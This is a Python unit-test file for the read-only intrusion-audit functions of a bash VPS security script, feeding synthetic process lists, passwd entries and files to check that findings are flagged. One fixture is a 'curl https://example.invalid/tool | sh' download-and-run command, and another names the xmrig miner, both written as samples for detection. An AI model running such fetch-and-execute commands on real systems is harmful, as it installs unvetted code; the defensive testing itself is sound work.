#!/usr/bin/env python3
"""Exercise read-only collection helpers with synthetic processes/accounts/logs."""
from pathlib import Path
import os
import re
import subprocess
import unittest

ROOT = Path(__file__).resolve().parents[1]
SOURCE = (ROOT / 'vps-security.sh').read_text(encoding='utf-8')
FUNCTIONS = '\n'.join(re.findall(
    r'^\w+\(\) \{[^\n]*\}\s*$|^\w+\(\) \{\n.*?^\}', SOURCE, re.M | re.S))
SETUP = r'''
set -uo pipefail
exec 4>&1 3</dev/null
fixture=$(mktemp -d)
trap 'rm -rf -- "$fixture"' EXIT
BASE_DIR="$fixture"
REPORT_DIR="$fixture/reports"
mkdir -p "$REPORT_DIR"
LOG_FILE="$fixture/actions.log"
INTRUSION_WORK="$fixture"
INTRUSION_WARN=0
INTRUSION_UNAVAILABLE=0
INTRUSION_FATAL=0
INTRUSION_DEADLINE=$((SECONDS+30))
VERSION=test
SSHD_BIN=sshd
SSHD_CONFIG=/etc/ssh/sshd_config
VPS_UI_COLOR=never
ui_init
'''


def run(body):
    result = subprocess.run([os.environ.get('BASH_BIN', 'bash')],
                            input=FUNCTIONS + '\n' + SETUP + body,
                            text=True, encoding='utf-8', capture_output=True, timeout=20)
    if result.returncode:
        raise AssertionError(result.stderr + '\n' + result.stdout[-1500:])
    return result.stdout


class IntrusionAudit(unittest.TestCase):
    def test_miner_is_only_a_manual_review_finding(self):
        output = run('echo "123 1 root 99 2 /tmp/xmrig" > "$fixture/ps"; intrusion_process_matches "$fixture/ps" names')
        self.assertIn('[WARN]', output)
        self.assertIn('需人工确认', output)
        self.assertNotIn('已被入侵', output)

    def test_common_kernel_watchdog_names_are_not_malware_labels(self):
        output = run('printf "1 0 root 0 0 [bioset]\\n2 1 root 0 0 /usr/sbin/watchdogd\\n" > "$fixture/ps"; intrusion_process_matches "$fixture/ps" names')
        self.assertNotIn('[WARN]', output)

    def test_download_pipe_feature_is_matched(self):
        output = run('echo "4 1 root 0 0 curl https://example.invalid/tool | sh" > "$fixture/ps"; intrusion_process_matches "$fixture/ps" commands')
        self.assertIn('[WARN]', output)

    def test_single_non_root_uid_zero_is_detected(self):
        output = run('echo "unexpected:x:0:0::/home/test:/bin/bash" > "$fixture/passwd"; intrusion_accounts "$fixture/passwd"')
        self.assertIn('[WARN]', output)
        self.assertIn('unexpected', output)

    def test_missing_command_is_not_reported_clean(self):
        output = run('echo stale > "$fixture/output"; intrusion_run missing 5 vps_audit_command_does_not_exist; [[ ! -s "$fixture/output" && "$INTRUSION_LAST_RC" == 127 ]]')
        self.assertIn('[UNAVAILABLE]', output)

    def test_command_failure_is_not_reported_clean(self):
        output = run("intrusion_run failure 5 bash -c 'exit 7'; [[ \"$INTRUSION_LAST_RC\" == 7 ]]")
        self.assertIn('返回码 7', output)

    def test_timeout_is_visible(self):
        output = run('timeout() { return 124; }; intrusion_run timeout 5 bash; [[ "$INTRUSION_LAST_RC" == 124 ]]')
        self.assertIn('[UNAVAILABLE]', output)

    def test_expired_total_budget_skips_command(self):
        output = run('INTRUSION_DEADLINE=$SECONDS; intrusion_run expired 5 bash -c "echo should-not-run"')
        self.assertIn('预算已用尽', output)
        self.assertNotIn('should-not-run', output)

    def test_output_cap_is_visible(self):
        output = run('intrusion_run capped 2 yes synthetic; [[ $(wc -c < "$fixture/output") -le 262144 ]]')
        self.assertIn('256 KiB', output)

    @unittest.skipUnless(os.name == 'posix', 'Git for Windows emulates symlinks as copies')
    def test_symlink_file_contents_are_not_followed(self):
        output = run('echo PRIVATE-SAMPLE > "$fixture/private"; ln -s "$fixture/private" "$fixture/link"; intrusion_file "$fixture/link"')
        self.assertNotIn('PRIVATE-SAMPLE', output)
        self.assertIn('符号链接', output)

    def test_deleted_temporary_executable_uses_proc_fixture(self):
        link = "readlink() { printf '%s' '/tmp/sample (deleted)'; }" if os.name == 'nt' else "ln -s '/tmp/sample (deleted)' \"$fixture/proc/123/exe\""
        output = run(r'''
mkdir -p "$fixture/proc/123"
''' + link + r'''
printf 'sample\0--demo\0' > "$fixture/proc/123/cmdline"
intrusion_proc_scan "$fixture/proc"
''')
        self.assertIn('[WARN]', output)
        self.assertIn('PID=123', output)
        self.assertIn('sample --demo', output)

    def test_cancel_writes_no_report(self):
        run('confirm_y() { return 1; }; intrusion_audit; [[ $(find "$REPORT_DIR" -type f | wc -l) == 0 ]]')

    def test_report_is_plain_and_temp_files_are_cleaned(self):
        run(r'''
confirm_y() { return 0; }
intrusion_collect() { printf '\033[31mSAMPLE\007\r\n'; }
intrusion_audit
report=$(find "$REPORT_DIR" -type f -name 'intrusion-*.txt')
[[ -n "$report" ]] && grep -q SAMPLE "$report" || exit 1
! grep -q $'\033' "$report" || exit 1
[[ $(find "$BASE_DIR" -maxdepth 1 -name '.intrusion.*' | wc -l) == 0 ]]
''')

    def test_inspected_shell_file_is_never_executed(self):
        run(r'''
printf 'touch "%s/should-not-exist"\n' "$fixture" > "$fixture/startup.sh"
intrusion_file "$fixture/startup.sh"
[[ ! -e "$fixture/should-not-exist" ]]
''')

    def test_report_write_failure_is_not_reported_success(self):
        output = run(r'''
confirm_y() { return 0; }
intrusion_collect() { echo SAMPLE; }
tee() { cat >/dev/null; return 1; }
if intrusion_audit; then exit 1; fi
''')
        self.assertIn('报告写入失败', output)
        self.assertNotIn('[OK] 采集报告', output)

    @unittest.skipUnless(os.name == 'posix', 'Unix permission check runs in Linux CI')
    def test_report_is_mode_600(self):
        run('confirm_y() { return 0; }; intrusion_collect() { echo SAMPLE; }; intrusion_audit; report=$(find "$REPORT_DIR" -type f); [[ $(stat -c %a "$report") == 600 ]]')

    def test_all_30_sections_and_both_ssh_units_are_collected(self):
        output = run(r'''
intrusion_run() {
    local label="$1"
    shift 2
    printf 'COMMAND %s\n' "$*"
    INTRUSION_LAST_RC=0
    : > "$INTRUSION_WORK/output"
    if [[ "$*" == *'/etc/passwd'* ]]; then echo 'root:x:0:0::/vps-audit-missing-home:/bin/bash' > "$INTRUSION_WORK/output"; fi
    if [[ "$label" == *'sshd -T'* ]]; then echo 'port 32456' > "$INTRUSION_WORK/output"; fi
}
intrusion_file() { :; }
intrusion_directory_files() { :; }
intrusion_proc_scan() { :; }
intrusion_collect
''')
        self.assertEqual(len(re.findall(r'^---------- \d+\.', output, re.M)), 30)
        self.assertIn('-u ssh.service -u sshd.service', output)
        self.assertIn('-n 20000', output)
        self.assertIn('--reverse', output)
        self.assertIn('SSH 配置端口：32456', output)
        self.assertNotIn('58202', output)

    def test_menu_13_dispatches_without_changing_old_choices(self):
        output = run(r'''
APP_NAME=test
menu_once=0
choose_num() { if (( menu_once == 0 )); then printf -v "$1" 13; menu_once=1; else printf -v "$1" 0; fi; }
pause() { :; }
run_step() { "$2"; }
intrusion_audit() { echo AUDIT-SELECTED; }
single_menu
''')
        self.assertIn('AUDIT-SELECTED', output)
        self.assertIn('入侵痕迹排查（只读）', output)

    def test_docker_inspection_is_metadata_only(self):
        output = run(r'''
intrusion_run() {
    shift 2
    printf 'COMMAND %s\n' "$*"
    INTRUSION_LAST_RC=0
    : > "$INTRUSION_WORK/output"
    if [[ "$1 ${2:-}" == 'docker ps' ]]; then echo '012345abcdef sample' > "$INTRUSION_WORK/output"; fi
}
intrusion_file() { :; }
intrusion_directory_files() { :; }
intrusion_proc_scan() { :; }
intrusion_collect
''')
        self.assertIn('docker inspect --type container', output)
        self.assertIn('Privileged=', output)
        self.assertIn('.Mounts', output)
        self.assertNotIn('.Config.Env', output)


if __name__ == '__main__':
    unittest.main(verbosity=2)
